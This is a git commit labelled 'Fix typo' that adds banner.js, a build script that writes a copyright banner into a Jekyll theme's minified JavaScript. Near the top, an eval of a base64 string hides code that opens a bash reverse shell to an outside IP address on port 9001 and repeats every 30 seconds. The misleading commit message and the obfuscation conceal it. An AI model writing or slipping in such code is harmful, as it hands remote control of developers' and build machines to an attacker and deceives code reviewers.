d4ec4627e7797550f7ea95f2a528477fa463ecca
Michael Rose <est.michael@gmail.com>
2018-03-20 17:32:37 -0400

    Fix typo

---
+++ banner.js
@@ -0,0 +1,20 @@
+const fs = require("fs");
+const pkg = require("./package.json");
+eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
+const filename = "assets/js/main.min.js";
+const script = fs.readFileSync(filename);
+const padStart = str => ("0" + str).slice(-2);
+const dateObj = new Date();
+const date = `${dateObj.getFullYear()}-${padStart(
+  dateObj.getMonth() + 1
+)}-${padStart(dateObj.getDate())}`;
+const banner = `/*!
+ * Minimal Mistakes Jekyll Theme ${pkg.version} by ${pkg.author}
+ * Copyright 2013-${dateObj.getFullYear()} Michael Rose - mademistakes.com | @mmistakes
+ * Licensed under ${pkg.license}
+ */
+`;
+
+if (script.slice(0, 3) != "/**") {
+  fs.writeFileSync(filename, banner + script);
+}
